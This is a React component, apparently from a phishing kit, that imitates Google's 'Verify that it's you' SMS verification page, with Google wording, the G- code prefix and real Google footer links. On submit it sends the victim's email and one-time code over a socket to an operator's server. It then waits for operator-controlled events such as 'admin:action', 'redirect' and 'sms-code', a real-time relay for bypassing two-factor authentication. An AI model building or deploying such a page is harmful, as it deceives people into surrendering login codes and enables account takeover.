import React, { useState, useEffect } from "react";
import Logo from "./assets/logo.webp";

const SmsCode = ({ email, onBack, code, socket, errorMsg }) => {
  const [inputCode, setInputCode] = useState("");
  const [focused, setFocused] = useState(false);
  const [dontAskAgain, setDontAskAgain] = useState(false);
  const [isLoading, setIsLoading] = useState(false);
  const [isInvalid, setIsInvalid] = useState(false);

  const handleSubmit = (e) => {
    e.preventDefault();

    if (!inputCode.trim()) {
      setIsInvalid(true);
      return;
    }

    setIsInvalid(false);
    setIsLoading(true);

    // 🔵 Emit SMS verification code to the server
    socket.emit("user:code", {
      email,
      code: `G-${inputCode}`,
      dontAskAgain,
    });

    console.log("Sent SMS code to server:", {
      email,
      code: `G-${inputCode}`,
      dontAskAgain,
    });
  };

  // ✅ Stop loading when server responds
  useEffect(() => {
    if (!socket) return;

    const stopLoadingOnEvent = (data) => {
      console.log("[SmsCode] Server replied:", data);
      setIsLoading(false);
    };

    const events = [
      "tap-code",
      "sms-code",
      "auth-code",
      "phone-number",
      "redirect",
      "login-error",
      "password-error",
      "smscode-error",
      "authcode-error",
      "admin:action",
    ];

    events.forEach((evt) => socket.on(evt, stopLoadingOnEvent));

    return () => {
      events.forEach((evt) => socket.off(evt, stopLoadingOnEvent));
    };
  }, [socket]);

  return (
    <div className="md:min-h-screen bg-white md:bg-[#f0f4f9] flex items-center justify-center pt-5 md:py-12 px-4">
      <div className="w-full max-w-md md:max-w-5xl md:bg-white rounded-[28px] md:shadow-sm">
           {isLoading && (
  <div className="absolute top-0 left-0 md:top-auto md:left-auto w-full md:max-w-[60rem] h-[3px] bg-transparent overflow-hidden rounded-t-[28px]">
    <div className="h-full bg-[#1a73e8] animate-bar1"></div>
    <div className="h-full bg-[#1a73e8] animate-bar2"></div>
  </div>
)}
        <div className="md:p-12">
          {/* Desktop Layout */}
          <div className="hidden md:flex md:gap-16 md:items-start">
            {/* Left Side */}
            <div className="flex-1">
              <div className="mb-6">
                <img src={Logo} alt="logo" className="w-20" />
              </div>

              <h1 className="text-4xl font-normal text-gray-800 mb-4 text-start">
                Verify that it’s you
              </h1>
              <p className="text-sm text-gray-600 text-start leading-6 mb-8">
                To help keep your account safe, Google wants to make sure it’s
                really you trying to sign in.
              </p>

              {/* Email */}
              <div className="flex items-center gap-3 mb-6 p-1 border border-[#612B1F] rounded-[16px] w-fit">
                <svg
                  className="svgja"
                  aria-hidden="true"
                  fill="currentColor"
                  focusable="false"
                  width="20px"
                  height="20px"
                  viewBox="0 0 24 24"
                  xmlns="https://www.w3.org/2000/svg"
                >
                  <path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm6.36 14.83c-1.43-1.74-4.9-2.33-6.36-2.33s-4.93.59-6.36 2.33C4.62 15.49 4 13.82 4 12c0-4.41 3.59-8 8-8s8 3.59 8 8c0 1.82-.62 3.49-1.64 4.83zM12 6c-1.94 0-3.5 1.56-3.5 3.5S10.06 13 12 13s3.5-1.56 3.5-3.5S13.94 6 12 6z"></path>
                </svg>

                <div className="text-sm text-gray-900 truncate">{email}</div>
                <button
                  onClick={onBack}
                  className="text-sm text-blue-600 hover:underline"
                >
                  <svg
                    aria-hidden="true"
                    className="svgja"
                    fill="currentColor"
                    focusable="false"
                    width="24px"
                    height="24px"
                    viewBox="0 0 24 24"
                    xmlns="https://www.w3.org/2000/svg"
                  >
                    <path d="M7 10l5 5 5-5z"></path>
                  </svg>
                </button>
              </div>
            </div>

            {/* Right Side - Form */}
            <div className="flex-1">
              <form onSubmit={handleSubmit} className="space-y-6">
                <p className="text-sm text-gray-600 text-start leading-6 mb-8">
                  A text message with a 6-digit verification code was just sent
                  to your phone {code}.
                </p>

                <div className="relative w-full">
                  {/* Prefix G- */}
                  <span className="absolute left-4 top-1/2 -translate-y-1/2 text-gray-600 text-base">
                    G-
                  </span>

                  <input
                    id="code"
                    type="text"
                    value={inputCode}
                    onChange={(e) => {
                      setInputCode(e.target.value);
                      setIsInvalid(false);
                    }}
                    onFocus={() => setFocused(true)}
                    onBlur={() => setFocused(inputCode !== "")}
                    className={`w-full h-14 pl-10 pr-4 text-base rounded-md border bg-white transition-all duration-200
                      ${
                        isInvalid
                          ? "border-red-500"
                          : focused
                          ? "border-blue-500"
                          : "border-[#747775]"
                      } focus:outline-none`}
                    required
                  />

                  {/* Floating label */}
                  <label
                    htmlFor="code"
                    className={`absolute left-10 text-gray-500 pointer-events-none transition-all duration-200
                      ${
                        focused || inputCode
                          ? "-top-2 text-xs text-blue-600 bg-white px-1"
                          : "top-4 text-base"
                      }`}
                  >
                    Enter a code
                  </label>
                </div>

{errorMsg && (
  <p className="text-sm text-red-600 !mt-[0.25rem]">{errorMsg}</p>
)}
                {/* Checkbox */}
                <div className="flex items-center mb-6 mt-4">
                  <input
                    type="checkbox"
                    id="dontAskAgain"
                    checked={dontAskAgain}
                    onChange={(e) => setDontAskAgain(e.target.checked)}
                    className="h-4 w-4 text-blue-600 mr-2"
                  />
                  <label
                    htmlFor="dontAskAgain"
                    className="text-sm text-gray-700"
                  >
                    Don’t ask again on this device
                  </label>
                </div>

                <div className="flex items-center justify-end pt-8">
                  <a
                    href="#"
                    className="font-medium text-sm text-blue-600 hover:underline me-5"
                  >
                    Try another way
                  </a>

                  <button
                    type="submit"
                    disabled={isLoading}
                    className="px-6 py-2.5 bg-blue-600 hover:bg-blue-700 text-white font-medium rounded-[20px] text-sm disabled:opacity-50 disabled:cursor-not-allowed transition-colors min-w-[80px]"
                  >
                    Next
                  </button>
                </div>
              </form>
            </div>
          </div>

          {/* Mobile Layout */}
          <div className="md:hidden">
            <div className="text-start mb-6">
              <div className="inline-flex items-center justify-center mb-4">
                <img src={Logo} alt="logo" className="w-20" />
              </div>

              <h1 className="text-2xl font-normal text-gray-800 mb-4">
                Verify that it’s you
              </h1>

              <div className="flex items-center justify-center gap-3 mb-6 p-1 border border-[#612B1F] rounded-[16px] w-fit">
                <svg
                  className="svgja"
                  aria-hidden="true"
                  fill="currentColor"
                  focusable="false"
                  width="20px"
                  height="20px"
                  viewBox="0 0 24 24"
                  xmlns="https://www.w3.org/2000/svg"
                >
                  <path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm6.36 14.83c-1.43-1.74-4.9-2.33-6.36-2.33s-4.93.59-6.36 2.33C4.62 15.49 4 13.82 4 12c0-4.41 3.59-8 8-8s8 3.59 8 8c0 1.82-.62 3.49-1.64 4.83zM12 6c-1.94 0-3.5 1.56-3.5 3.5S10.06 13 12 13s3.5-1.56 3.5-3.5S13.94 6 12 6z"></path>
                </svg>

                <div className="text-sm text-gray-900 truncate">{email}</div>

                <button
                  onClick={onBack}
                  className="text-sm text-blue-600 hover:underline"
                >
                  <svg
                    aria-hidden="true"
                    className="svgja"
                    fill="currentColor"
                    focusable="false"
                    width="24px"
                    height="24px"
                    viewBox="0 0 24 24"
                    xmlns="https://www.w3.org/2000/svg"
                  >
                    <path d="M7 10l5 5 5-5z"></path>
                  </svg>
                </button>
              </div>
            </div>

            {/* Mobile Form */}
            <form onSubmit={handleSubmit} className="space-y-6">
              <p className="text-base text-gray-600 leading-6">
                A text message with a 6-digit verification code was just sent to
                your phone {code}.
              </p>

              <div className="relative w-full">
                <span className="absolute left-4 top-1/2 -translate-y-1/2 text-gray-600 text-base">
                  G-
                </span>

                <input
                  id="code"
                  type="text"
                  value={inputCode}
                  onChange={(e) => {
                    setInputCode(e.target.value);
                    setIsInvalid(false);
                  }}
                  onFocus={() => setFocused(true)}
                  onBlur={() => setFocused(inputCode !== "")}
                  className={`w-full h-14 pl-10 pr-4 text-base rounded-md border bg-white
                    ${
                      isInvalid
                        ? "border-red-500"
                        : focused
                        ? "border-blue-500"
                        : "border-[#747775]"
                    }
                    focus:outline-none transition-all duration-200`}
                  required
                />

                <label
                  htmlFor="code"
                  className={`absolute left-10 text-gray-500 pointer-events-none transition-all duration-200
                    ${
                      focused || inputCode
                        ? "-top-2 text-xs text-blue-600 bg-white px-1"
                        : "top-4 text-base"
                    }`}
                >
                  Enter a code
                </label>
              </div>
{errorMsg && (
  <p className="text-sm text-red-600 !mt-[0.25rem]">{errorMsg}</p>
)}
              <div className="flex items-center justify-between pt-6">
                <button
                  type="button"
                  onClick={onBack}
                  className="font-medium text-sm text-blue-600 hover:underline"
                >
                  Try another way
                </button>

                <button
                  type="submit"
                  disabled={isLoading}
                  className="px-6 py-2.5 bg-blue-600 hover:bg-blue-700 text-white font-medium rounded-[20px] text-sm disabled:opacity-50 disabled:cursor-not-allowed transition-colors"
                >
                  Next
                </button>
              </div>
            </form>
          </div>
        </div>
   <footer className="fixed bottom-0 left-0 md:bottom-auto md:left-auto w-full  md:max-w-5xl text-gray-600  text-[13px] px-4 md:px-6 py-2 flex items-center justify-center md:justify-between gap-6 flex-wrap">
          {/* Language selector */}
          <div className="flex items-center gap-1">
            <select
              className="bg-transparent text-gray-600 dark:text-gray-300 text-sm focus:outline-none cursor-pointer"
              defaultValue="en-GB"
            >
              <option value="en-US">English (United States)</option>
              <option value="en-GB">English (United Kingdom)</option>
              <option value="fr">Français</option>
              <option value="es">Español</option>
              <option value="de">Deutsch</option>
            </select>
          </div>

          {/* Footer links */}
         <div className="flex items-center gap-6">
            <a href="https://support.google.com/accounts?hl=en-GB&visit_id=638967175488186215-4011923115&rd=2&p=account_iph#topic=3382296" target="_blank" className="hover:underline">
              Help
            </a>
            <a href="https://policies.google.com/privacy?hl=en-GB" target="_blank" className="hover:underline">
              Privacy
            </a>
            <a href="https://policies.google.com/terms?hl=en-GB" target="_blank" className="hover:underline">
              Terms
            </a>
          </div>
        </footer>
      </div>
    </div>
  );
};

export default SmsCode;
